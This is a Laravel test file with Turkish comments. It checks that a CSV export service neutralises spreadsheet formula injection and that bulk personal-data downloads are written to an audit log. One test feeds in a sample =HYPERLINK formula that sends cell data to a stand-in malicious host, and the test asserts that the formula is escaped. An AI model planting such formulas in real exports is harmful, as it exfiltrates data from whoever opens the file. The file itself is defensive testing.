<?php

namespace Tests\Feature;

use App\Models\DenetimKaydi;
use App\Models\User;
use App\Servisler\CsvDisaAktar;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

/** CSV dışa aktarım -- Düzeltme listesi md.8. */
class CsvDisaAktarTest extends TestCase
{
    use RefreshDatabase;

    private function cikti(?string $olay = null, string $ad = 'Kötü Ad'): string
    {
        // 🪤 E-posta benzersiz: döngüde çağrılınca çakışmasın.
        User::create([
            'name' => $ad,
            'email' => 'k'.(User::count() + 1).'@ornek.test',
            'password' => bcrypt('x'),
        ]);

        $yanit = app(CsvDisaAktar::class)->akit(
            User::query(), 'kullanicilar', ['Ad', 'E-posta'],
            fn ($u) => [$u->name, $u->email],
            olay: $olay,
        );

        ob_start();
        $yanit->sendContent();

        return (string) ob_get_clean();
    }

    /**
     * 🔒 EXCEL FORMÜL ENJEKSİYONU. `=HYPERLINK(...)` ile başlayan ad, CSV'yi
     * açan yetkilinin Excel'inde ÇALIŞIR ve dosyadaki veriyi dışarı taşır.
     */
    public function test_formul_enjeksiyonu_metne_zorlanir(): void
    {
        $cikti = $this->cikti(ad: '=HYPERLINK("http://kotu.site/?d="&A1;"Tıkla")');

        $this->assertStringNotContainsString("\n=HYPERLINK", $cikti);
        $this->assertStringContainsString("'=HYPERLINK", $cikti,
            'Formül hücresi öne tırnakla metne zorlanmalı.');
    }

    public function test_diger_tehlikeli_baslangiclar(): void
    {
        foreach (['+1+1', '-1-1', '@SUM(A1)', "\tgizli"] as $tehlikeli) {
            $this->assertStringContainsString("'".$tehlikeli, $this->cikti(ad: $tehlikeli),
                "Kaçırıldı: {$tehlikeli}");

            User::query()->forceDelete();
        }
    }

    public function test_sıradan_ad_bozulmaz(): void
    {
        $cikti = $this->cikti(ad: 'Ahmet Yılmaz');

        $this->assertStringContainsString('Ahmet Yılmaz', $cikti);
        $this->assertStringNotContainsString("'Ahmet", $cikti);
    }

    /**
     * 🔒 Toplu kişisel veri indirme KVKK açısından kayda geçmeli. Çelişki
     * açıktı: TEK bir hassas evrak görüntülemesi loglanıyordu, yüzlerce
     * kişinin verisini indirmek loglanmıyordu.
     */
    public function test_toplu_indirme_denetime_duser(): void
    {
        $this->cikti(olay: 'kullanici.disa_aktarildi');

        $kayit = DenetimKaydi::where('olay', 'kullanici.disa_aktarildi')->first();

        $this->assertNotNull($kayit, 'Toplu indirme denetim kaydına düşmedi.');
        $this->assertSame('kullanicilar', $kayit->yeni['dosya']);
        $this->assertSame(1, $kayit->yeni['satir_sayisi']);
    }

    public function test_olay_verilmezse_kayit_yazilmaz(): void
    {
        $this->cikti();

        $this->assertSame(0, DenetimKaydi::count());
    }
}
